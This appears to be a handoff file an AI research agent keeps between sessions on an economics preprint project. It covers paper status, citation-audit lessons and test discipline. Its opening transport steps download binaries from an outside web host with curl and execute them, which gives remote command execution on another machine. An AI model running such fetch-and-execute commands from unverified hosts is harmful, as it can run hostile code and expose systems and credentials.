---
project: wealth-tensor
gh_sha: PENDING_STAMP
updated: 2026-08-10
session: wealthTensor-06
gate_passed: true
gate_version: "2.50"
---

# wealth-tensor — HANDOFF

*Overwritten every session. `git log -p docs/HANDOFF.md` is the archive. Run
`python3 scripts/handoff_gate.py --check` before trusting this file.*

## 0 · TRANSPORT — darlish, zero-bridge. No bridge theatrics; darlish does not use it.

Step 0 in a cold container, no pre-staged secret:

```
curl -s https://system.europeanflorist.com/dsh/darlish-up -o /tmp/darlish-up && chmod +x /tmp/darlish-up && /tmp/darlish-up
```

It prints a `DARLISH-ENROLL v1 id=… fp=…` line. Post it **exactly** as a comment on Asana task
`1217316841710435` via the session's Asana MCP, then run `/tmp/darlish-up` again to collect.

> **The collect may legitimately need TWO runs** — `dwait` times out loudly at 150 s. In
> wealthTensor-05 the comment was posted correctly and the first collect timed out anyway; the
> second succeeded instantly. **In wealthTensor-06 the first collect succeeded**, so treat this as
> "re-run before diagnosing", not as an expected failure. Whole cycle ~4 minutes.

```
curl -s https://system.europeanflorist.com/dsh/dx -o /tmp/dx && chmod +x /tmp/dx && /tmp/dx --selftest
/tmp/dx '~/Scripts/roster join --who big-wealthTensor-07 --task "<what you are doing>"'
/tmp/dx '~/Scripts/roster claim --who big-wealthTensor-07 --resource wealth-tensor'
```

`roster claim` needs **`--who` AND `--resource`** (L23). `roster join` and `claim` **succeed
silently** — no output is success, not failure; confirm with `roster who`. dx exit 3 = never ran,
safe retry; exit 4 = check state first. **Do NOT route EDGAR or bulk web work through darwin** — the
cloud container reaches `data.sec.gov` and `www.sec.gov` directly (L18).

## 1 · IDENTITY + MISSION

You are Jason's co-author on **wealth-tensor** — an eleven-year synthesis being turned into **four
pre-prints** (ADR-001).

**Two intentions, equally weighted.** (1) Ship them. (2) **Have fun.** Hobby, no tenure, he is not
trying to be safe and says so. If it stops being enjoyable that is a defect, not a mood.

**He invites criticism and means it, and the evidence is now five sessions deep.** S3 reported that
his framework's sharpest prediction lost. wealthTensor-04 ran an agent instructed to *reject* the
flagship and accepted both FATAL findings. wealthTensor-05 found three defects in work marked
complete forty minutes earlier. **wealthTensor-06 drafted Paper I and had it rejected by its own
referee the same day, and withdrew two of its six contributions as not new.** Agreeing with him is
not the job. **Agreeing with yourself is not the job either** — see WT-065.

**The prose is disposable; the structure is precious.** He remasters every sentence in his own
voice, so LLM-register drafting is fine. What must NOT happen is laundering *his* insight into your
paraphrase. When he coins something — *"force-fit, not form-fit"* (WT-042) — it goes in **verbatim**
and is credited.

**How he works on content:** his research notes are **on paper**. Read the note back to him before
building on it.

**Ask whether he has had his coffee.** A **register check, not a HITL gate** — when he is tired,
lead with the recommendation and one line of why; hold the long argument until asked. In
wealthTensor-06 he answered "coffee was this morning, my frontal cortex is mashed potatoes" and
asked for ELI-18. That worked well: recommendation first, short sentences, the long version on
request.

**Audience: his three children, 18, 11 and 8.** Load-bearing. It decided that `docs/` stays public,
that *Abandoned Approaches* is in every paper, that the failed pre-registration is part of the
deliverable, and that the papers ship **with their own hostile referee reports** — now two of them.

## 2 · ORIENT — run these, do not skim

```
git -C ~/repos/wealth-tensor pull --ff-only
python3 ~/repos/wealth-tensor/scripts/handoff_gate.py --check   # 0 pass · 1 blocker · 2 CANNOT VERIFY
cat  ~/repos/wealth-tensor/docs/adr/ADR-001-paper-decomposition.md      # incl. ALL THREE addenda
cat  ~/repos/wealth-tensor/docs/papers/paper-I-price-formation/REVIEW-002-internal-referee.md
cat  ~/repos/wealth-tensor/docs/papers/paper-III-dual-tensor/REVIEW-001-internal-referee.md
cat  ~/repos/wealth-tensor/docs/LEDGER.md                        # 67 entries — the project's brain
python3 ~/repos/claude-blackbook/lessons.py doctrine
python3 ~/repos/claude-blackbook/lessons.py search "<your task>" --scope global,wealth-tensor
```

> **Read REVIEW-002 before touching Paper I.** It is the shortest path to understanding why the
> obvious next move — "tidy up Paper I and ship it" — is wrong.

Corroborate what you use: `lessons.py use <id> --task <tag>` at orient,
`lessons.py record-outcome <tag> pass` at wrap.

## 3 · STATE

- **Code — 109 tests passing**, tree clean and pushed. Six model modules, `scripts/patchkit.py`
  (L25), and new this session `scripts/wt018_report.py` — Paper I's regeneration command.
- **Paper II — COMPLETE.** References verified 2026-08-10, SHA pinned to **d655501**, zero live
  placeholders. **Ready to submit when Jason says so. He has not said so.**
- **Paper III — v0.3, post-referee, references verified.** ~11k words, all 20 references ✓ with
  nine ✓✎. Ships with `REVIEW-001`. **Its §9 crash-risk positioning is still written from a search
  rather than from reading the papers** — untouched this session, and still item 2.
- **Paper I — v0.1 drafted and REJECTED.** ~7.1k words in
  `docs/papers/paper-I-price-formation/paper-I.md`, marked **SUPERSEDED** with a header block naming
  the fatal findings. `REVIEW-002` sits beside it. **Do not revise this draft. Re-scope it.** §5.
- **Paper IV — unstarted.** Still blocked on I.
- **WT-026 remains CLOSED and it closed by failing.** PRE-002's stopping rule fired and stays fired.
- **Manuscript** (Google Doc `1RjAHJ7jHCX_N3ToHtstQvjlMb-BQz-iejBZ9Y4f58V8`) — untouched since S2.
  Restore points: S1 `1fszgf295NGfvfQlT3VaCrRXrXA4K589tlS-bVsUIok4` ·
  S2a `1FeXUSbrFQQXDOaSxCoul13lE6LWicxMuJGL8xJKSLjs` ·
  S2b `12jJh93VhgfOe8EQ3J23G9heQekSCdzxHTm75ut8RL6g`.

## 4 · DOCTRINE / GUARDRAILS

- **Blanket edit permission on the manuscript.** "A construction zone to build a mock-up."
- **Fresh restore point before every edit session, and VERIFY it.**
- **Never add a free parameter to absorb an objection.** Refused **six** times.
- **Every pre-registration states its BRIDGE assumption** as a numbered proposition (WT-049).
- **WT-052 — a registration must precede the INSTRUMENT'S CODE**, not merely the result.
- **WT-053 — every published number comes from a committed script that has been run.**
- **WT-054 — two adversarial agents before any preprint commits.** They find disjoint defects.
- **WT-065 — AND WT-054 FIRES TOO LATE.** *Adversarial review is triggered when a finding is about
  to be **called a result** — banked in the ledger, written into a paper, or told to Jason,
  whichever comes first.* Not at the preprint. Three checks, each cheap: a **priority audit** by an
  agent told that an over-eager priority claim is as damaging as a missed one; an attempt to
  **refute the interpretation** separately from checking the arithmetic; and for anything with a
  rhetorical payload, *what would have to be true for this to be false, and is it?*
- **WT-056 — prefer the STRUCTURAL fact to the CONTINGENT one.**
- **WT-057 — grep the WRONG form across every file after a correction.** wealthTensor-06 produced
  the sharpest instance yet: the paper correctly disowned "SMD requires two goods" while **the test
  it named as the guarantee, the module header, and the regeneration output all still said it.**
- **WT-058 — a multi-anchor edit validates ALL anchors before writing.** Use `scripts/patchkit.py`
  (L25). *Exception:* when you are replacing a whole file you own, edit a local copy and `dx --put`
  it — that is atomic by construction and is not hand-rolling.
- **WT-059 — verifying a REFERENCE and verifying a CITATION are different acts.**
- **WT-060 — a word you use inconsistently is a word you have not checked.**
- **WT-061 — prose that counts or names items in an adjacent list is a hand-cached derived value.**
- **WT-062 — search Jason's library by TITLE, not author; a null is not absence; ASK before
  deleting a citation on the strength of one.**
- **A pre-registration is append-only after its first result commit.**
- **Do not oversell.** Standing guard-tests, and **check they can actually fail** — wealthTensor-06
  shipped one asserting `4/21 < 4/11 < 4/7 < 4/3`, a statement about four rational constants.
- **The tone is load-bearing.** No grumpiness; humour lands the news, especially bad news.

## 4b · THE DECISION THAT FRAMES EVERYTHING · and the DEFINITION OF DONE

**`docs/adr/ADR-001-paper-decomposition.md` — read it, including ALL THREE addenda.** The split and
the order were relitigated and reaffirmed 2026-08-10; the third addendum (wealthTensor-06) records
that Paper I's claim as stated in §Decision is one step weaker than the code supports — **and
REVIEW-002 then found that the sharpened version overreaches in a different direction.** Read both.

**I** price formation · **II** redistribution *(complete)* · **III** the dual tensor *(v0.3)* ·
**IV** the atomic theory. Order: **II → III → I → IV**.

> **DEFINITION OF DONE.** Four preprints publicly posted, each carrying: abstract, keywords, JEL
> codes, a numbered contributions list, an Abandoned Approaches section, a limitations section, a
> data/code availability statement naming the repo and a pinned commit SHA, and *Independent
> researcher* as the affiliation. Paper III additionally cites PRE-001/PRE-002 and their registering
> commit SHAs. When the fourth is posted, this project is done and the repo becomes an archive.

**Progress: II done. III drafted, reviewed, reference-complete, one known exposure. I drafted,
reviewed, REJECTED, needs re-scoping. IV unstarted.** Drive at finishing.

## 5 · MISSION — ranked

### START HERE — **Paper I, re-scoped. Not revised.**

**Read `REVIEW-002-internal-referee.md` first.** The short version: four FATAL findings, and two of
six contributions withdrawn as not new. Editing around them produces a paper that is still wrong.

**The claim that survives, and it is narrower than the title asserts:** *supply and demand are not
independent **as functions of the allocation** — the allocation cancels from their difference
identically, z(p) = #{mᵢ > p} − S at every price that is not itself a reservation price.* That is
true, it is pinned by a test, and no source checked states it.

**But do the literature search BEFORE writing a word.** REVIEW-002's auditor was explicit that the
observation is one short step from Coase, Gorman, Böhm-Bawerk and Shapley–Shubik and is **plausibly
folklore**, and named where to look: **Gul & Stacchetti**, **Demange–Gale–Sotomayor**, and
law-and-economics treatments of the Coase theorem in indivisible-goods markets. **This search is a
precondition, not an optional extra.** If it turns out to be folklore too, that is a finding and the
paper becomes something else — possibly a short expository note, which is an honourable artifact and
should be discussed with Jason rather than decided alone.

**What must be cited whatever happens:** Böhm-Bawerk (1889, Smart trans.) for *marginal pairs* —
the term and the object are his, and his horse-market numbers reproduce this paper's formula to the
shilling; **Shapley & Shubik (1971)** for the modern formalisation; **Theocharis (1960)**,
**Fisher (1961)** and **Bischi et al. (2010) eq. 2.26** for everything in §4.2; **Coase (1960)** and
**Gorman (1953)** as adjacent-but-not-displacing, with the distinctions REVIEW-002 states.

**Structural repairs the re-scope must make:** drop or rebuild §3.3 (circular — `marshallian_cross`
is computed *from* excess demand); fix §3.4 (its transform makes *c(m)* a function of the
allocation, which breaks §3.1 — this needs to be *reported*, not hidden); drop the §3.2/§3.3
"1 distinct value" rows (tautologies — `marginal_pair()` never reads `holders`); rewrite §4.3's
Lerner paragraph (the identity is the FOC, so it is baked in); and decide whether §4 belongs at all
— the referee would not accept it, and the join is thinner than ADR-001 assumes.

### 2 — **Read the crash-risk literature properly. Paper III's biggest remaining exposure.**

**Untouched in wealthTensor-06 and it moved up, not down.** Jin & Myers (2006), Hutton, Marcus &
Tehranian (2009), unbroken through 2026: firms hoard bad news until it releases at once and the
price moves discontinuously. **That is Paper III's thesis, twenty years earlier.** §9 positions
against it *from a search, not from having read the papers.* A referee will know the difference —
**and wealthTensor-06 is now direct evidence of what happens when a positioning claim meets someone
who has read the literature.** Read them properly. The framing to test: the recognition event is the
accounting-layer cause of which the price crash is the price-layer effect.

### 3 — **Submit Paper II.** Done, and has been for three sessions.

Read `docs/papers/PREPRINT-CHECKLIST.md` §C and **re-verify the venue rules live** — checked
2026-08-05, venue rules rot. **SSRN has no gate in and NO APPEAL out** (WT-051). **This is a Jason
decision to trigger, not a Claude decision.** Ask.

### 4 — **Attribution pass (WT-044). Now with evidence behind it.**

Still absent: **Sraffa**, **Robinson**, **Samuelson**, **Godley/Lavoie**, **Farmer**, **Lillo** in
Papers II–IV — all now drafted into Paper I, so lift the verified entries from its reference list
rather than re-verifying. **And note what wealthTensor-06 proved about this item's value:** the
attribution audit found five works Paper I needed and had not cited, two of which displaced
contributions. This is not tidying. **Check his library first (L24).**

### 5 — **Citation-graph whitespace test (WT-006).** `verify: grep -ril openalex src/ scripts/`

### 6 — **ASK Jason, both cheap, both genuinely his.**

- **Checkbox lists (WT-008).** All 57 manuscript references render as `- [ ]`. *Recommend:* plain
  bullets.
- **The twin document (WT-009).** `2The Axiomatic Reconstruction of`, 19 KB, never diffed. *Ask:*
  may a session spend one call diffing it? *Recommend:* yes.
- **NEW — the house style.** REVIEW-002's referee counted **24** places where Paper I announces its
  own rigour rather than demonstrating it, then observed that the structure is *identical* in
  Papers II and III: *"a defence that recurs across three papers is not a defence, it is a house
  style."* By the programme's own rule (*a defence that recurs is a tell*) that is a real finding.
  **It is a register question, and register is Jason's.** Put it to him; do not strip it unilaterally.

### 7 — **PRE-003: the segment-level test.** Teed up deliberately, NOT started.

Registers from scratch, states its bridge proposition (WT-049), obeys WT-052, and **may not cite
PRE-001/002's failure as support for anything.**

### 8 — **Language remaster.** His job, explicitly. A word wrong in the FIELD'S TECHNICAL REGISTER
is yours (WT-060); a word that is merely his is not.

### TEED UP, small: the module identifiers `crisis_threshold` and `n_crises` still carry the old
vocabulary. The paper discloses them so nothing is wrong. Rename when `lag.py` is already open.

### PARKED, do not start — **THE MONOGRAPH.** After Paper IV. ADR-001 §Relitigation record.

## 6 · VERIFY GATE

```
cd ~/repos/wealth-tensor && ./.venv/bin/python -m pytest tests/ -q   # expect 109 passed
./.venv/bin/python scripts/wt018_report.py                          # Paper I, §3 + §4
./.venv/bin/python scripts/wt027_report.py                          # Paper III §3.4 + §4
./.venv/bin/python scripts/wt002_lambda_report.py                   # Paper III §3.3
./.venv/bin/python scripts/wt030_report.py                          # Paper II §3
git commit ...                                                      # the LAST content commit
python3 scripts/handoff_gate.py --stamp
git commit -am "docs: stamp handoff gh_sha to HEAD"
python3 scripts/handoff_gate.py --emit
bash ~/Scripts/gate-selfcheck.sh                                    # expect PASS
/tmp/dx '~/Scripts/roster leave --who big-wealthTensor-07'
```

**`--emit` does not stamp**, and refuses on `gate_passed: false`. Walk
`~/Desktop/downloads/HANDOFF-GATE.md` — trust the file header for the version.

## 7 · ORIENT-THEN-GO

Emit ONE orientation line — `Oriented: <state> · next at-bat: <X> · opening with <first action>.` —
then proceed. Do not wait for Jason's go.

---

## LUT — hard-won facts. Read before touching anything.

| # | Fact |
|---|---|
| **L28** | **NEW — an agent asked to check a priority claim will AGREE with it unless you tell it not to.** wealthTensor-06's audit was prompted with *"an over-eager priority claim is as damaging as a missed one"* and returned a **mixed** verdict: two DISPLACES, one PARTIALLY, three DOES-NOT-DISPLACE. Blanket acceptance would have withdrawn three sound contributions. Also **demand that the auditor state what it could not access** rather than inferring — ours flagged two paywalled primaries (Fisher 1961, Gorman 1953) and the verdicts survived on secondary evidence that it named. |
| **L27** | **NEW — measure a constrained quantity AFTER the last edit that touches it, not after the first.** The abstract was measured at 255 words, cut, and then edited again for other reasons; the second edit put it back to **266** and it was reported as fixed. The count is a derived value in exactly WT-061's sense. Same class as WT-057: *never verify by re-reading the thing you just fixed.* |
| **L26** | **NEW — `scripts/prototypes/` is one level deeper than `scripts/`.** A prototype importing `src/` needs `parent.parent.parent / "src"` (three levels); one importing `patchkit` needs `parent.parent` — which *is* `scripts/` — **not** `parent.parent / "scripts"`. Both bit once each in wealthTensor-06. Also: an f-string containing a set-builder like `#{m_i > p}` silently becomes a format expression and raises `NameError`. |
| **L25** | **`scripts/patchkit.py` — use it for any multi-anchor documentation edit.** `from patchkit import apply_edits; apply_edits([(path, old, new, "label"), ...])`. Validates **every** anchor against in-memory text and raises `AnchorError` having written **nothing**. **Anchor on a span with no internal newline** — in a file hard-wrapped at 100 columns, every anchor that has ever missed in this project missed on a line break, never on a word. *And when you are replacing a whole file, don't use it* — edit a local copy and `dx --put`; that is atomic already. |
| **L24** | **Jason's library is searchable from darwin and it settles citation questions the web cannot.** `~/Desktop/downloads` (flat; filenames usually carry publisher + year + ISBN) and `/Volumes/Jason2/BOOK MASTERS` (topic folders). **Search by TITLE, not author.** **`find` on the NAS at full depth TIMES OUT** — use `-maxdepth 2`. `pdftotext` at `/opt/homebrew/bin/pdftotext`; a colophon is in the first 8–10 pages. **A null is "not in the indexed subset", NOT "he does not own it"** — seven Kindles, mid-reorganisation. *wealthTensor-06 hit both outcomes: the sweep found **Cournot** and corrected the entry from the 1838 French original to the Kelley 1960 reprint of the Bacon translation, and found none of Marshall, Sraffa, Robinson or Samuelson — and removed nothing on that basis.* |
| **L23** | `roster claim` requires `--who` AND `--resource`. Both `join` and `claim` **print nothing on success**; confirm with `roster who`. |
| **L22** | A mutation harness editing a Python source in place must clear `__pycache__` between mutants AND print a mutation-specific fingerprint. **The tell is two different mutants producing byte-identical failure output.** |
| **L21** | **The pre-registration workflow:** commit the registration **alone**, push, *then* write the analysis code, *then* compute. AMENDED by WT-052. |
| **L20** | `dx --put` fails if the parent directory does not exist on darwin. `dx 'mkdir -p …'` first. |
| **L19** | The CIK→SIC map including dead registrants is `sub.txt` inside the SEC Financial Statement Data Set quarterly ZIPs. Building a universe from a current registrant list is a **survivorship trap**. |
| **L18** | **The cloud container reaches `data.sec.gov` and `www.sec.gov` directly.** Do not route bulk web data through darwin. Work in the container, `dx --put` to darwin, commit there where `gh` is authed. |
| **L17** | **EDGAR `companyfacts`: Q4 is almost never tagged as a quarter.** Recover quarters by differencing cumulatives sharing a fiscal-year start date. |
| **L16** | Measure the manuscript, don't opine about it. Parsing it in python is three lines and has been right every time. |
| **L15** | Mutation-test any result you intend to publish, and confirm the *right* test screams. See L22. |
| **L14** | `conftest.py` only fires under pytest; `scripts/` needs its own shim: `sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent / "src"))`. |
| **L13** | **A multi-line commit message or script will not survive `dx`'s quoting** — nor will a heredoc. `dx --put` it to a file (for commits, **`.git/COMMIT_DRAFT`**, then `git commit -F`). Inside `.git/` specifically: a draft in the working tree gets swept up by `git add -A`. Also: `$HOME` in the cloud shell is `/root` — use literal `~` in dx paths. *(Followed correctly all session in wealthTensor-06; the pattern works.)* |
| **L10** | Every model checked against a closed form, a published result, or a hand-verified case. |
| **L9**  | venv at `.venv`. Tests: `./.venv/bin/python -m pytest tests/ -q`. Root `conftest.py` inserts `src/`. |

**Google Docs API** *(unchanged; only needed if the manuscript is reopened)* — L1–L8, L11, L12 are
in `git log -p docs/HANDOFF.md`. The load-bearing four: **L11** use `find_and_replace_doc` to change
existing text. **L12** verify a doc edit *structurally* by exporting via the cloud
`Google_Drive__read_file_content` and diffing the array of `#`-prefixed and list-item lines. **L3**
never infer indices by arithmetic. **L7** cloud `Google_Drive` is create/read only — but `copy_file`
**is** a create, so **restore points need no bridge**.

---

## WHAT wealthTensor-06 DID

**The at-bat was "assemble Paper I, it is the fastest artifact left." It was assembled, reviewed and
rejected in the same session, and the rejection is worth more than the assembly.**

**Built the regeneration script Paper I never had, expecting a WT-027 repeat.** Paper I's headline
figures had been hand-transcribed into the ledger on 2026-08-04 and pinned by no test since — the
exact setup that produced WT-027's near-miss. **Every figure regenerated bit for bit.** The guard
found nothing to guard against.

**And then the script earned its keep by a route nobody planned.** Writing it surfaced two things
the modules supported and nobody had stated: that the allocation cancels from excess demand
*identically* rather than only at the crossing, and that the damping stabilising Cournot tâtonnement
obeys *d* < 4/(*n*+1). Both were checked against the code. Both reproduced. **Both were then banked
as ledger RESULTS, pinned with new tests, written into a paper, recorded in an ADR addendum,
committed, pushed, and reported to Jason as discoveries.**

**Drafted Paper I** — ~7.1k words, full apparatus, opening by citing P3 from Paper III rather than
restating it — **and ran the references through two separate passes.** Bibliographic found one error
(Bertrand is *Journal des Savants* **67**, not 68). Cited-in-text found a whole failure *mode*:
entries listed and never mentioned, and more invoked **eponymously** — "Walrasian excess demand",
"the Marshallian cross", "the Lerner condition" — prose that names a person and cites nothing, so
the body reads as attributed while the list reads as used and neither file reveals the gap alone.
**A bibliographic pass structurally cannot see that**, because every entry it checks is real.

**Then WT-054 fired, and the paper did not survive it.** Three agents: one checking every number
against the code, one instructed to reject, one auditing the second's priority claims. The numeric
pass came back **clean on every figure** and found eleven defects around them — including a **wrong
eigenvalue expression** (the damped Jacobian has a second eigenvalue, 1 − *d*/2, and the stability
condition survived only because the symmetric mode always binds first). The rejecting referee found
that the paper's central negative claim is **false in the paper's own model**, and demonstrated it
with the repository's unmodified code. And the priority audit found that **two of six contributions
were 65 and 137 years old.**

**Böhm-Bawerk, 1889.** *Marginal pairs* is his term, verbatim, for exactly this object. The auditor
took his horse-market valuations off page 203, pooled the eighteen reservation prices, set *S* = 8,
and evaluated this paper's formula against them: it reproduces his stated price zone of £21 to
£21:10s **to the shilling**. Shapley & Shubik (1971) formalised it — their §4 is titled *"The Horse
Market of Böhm-Bawerk."* And the Cournot result is Theocharis (1960) for the gain, Fisher (1961) for
the *n*-dependence, and **eq. (2.26) of a 2010 Springer monograph** for the bound, where it is a
routine worked example.

*The lesson of the session, and it is not the same as wealthTensor-05's.* That session learned that
**the second pass must ask a different question**. This one learned **when the passes must run.**
The gap between finding those two results and disbelieving them was several hours and four artifacts
wide — a ledger entry, a test, a paper section, an ADR addendum, a push, and a message to Jason,
all before anything adversarial ran. Nothing in the verification was wrong; it was answering the
wrong question. *Reproducing from the code proves the finding is true of the model. It says nothing
about whether it is new, and nothing about whether the interpretation follows.* WT-065 moves the
trigger to the moment a finding is about to be **called** a result.

*And the failure worth copying, because it is the same shape as wealthTensor-05's and points the
other way.* That session's two provenance errors both pushed toward **deleting** a citation, and the
lesson was that rigour which only subtracts is a bias with good manners. This session's audit pushed
the opposite direction — it found **five works that should have been cited and were not**, in a
paper carrying a 1,345-word apparatus auditing its own bibliography. **An apparatus this elaborate
that misses Coase, Gorman, Böhm-Bawerk, Theocharis and Fisher is auditing the wrong axis.** Both
failures are the same failure: checking the thing that is easy to check.

*One more, filed under things a future session should find funny rather than repeat.* The paper
correctly identified that "SMD requires at least two goods" is wrong, disowned it in §3.5, and named
`test_excess_demand_is_monotone_here_so_this_is_not_an_SMD_result` as the mechanism enforcing the
limit. **That test's docstring said "SMD pathology needs at least two goods."** So did the module
header. So did the regeneration output the paper directs readers to. Three files carrying the error
the paper identifies and disowns — WT-057's sharpest instance yet, and it was found by an agent
reading the artifacts the paper points at rather than the paper.

*And the shortest one.* A standing "overclaim guard" test closed with
`assert 4.0/21 < 4.0/11 < 4.0/7 < 4.0/3` — a statement about four rational constants, referencing no
model output, incapable of failing. §8 claimed two tests existed to make overclaiming fail loudly.
One of them could not fail at all. It now measures the boundary and asserts that it moves.
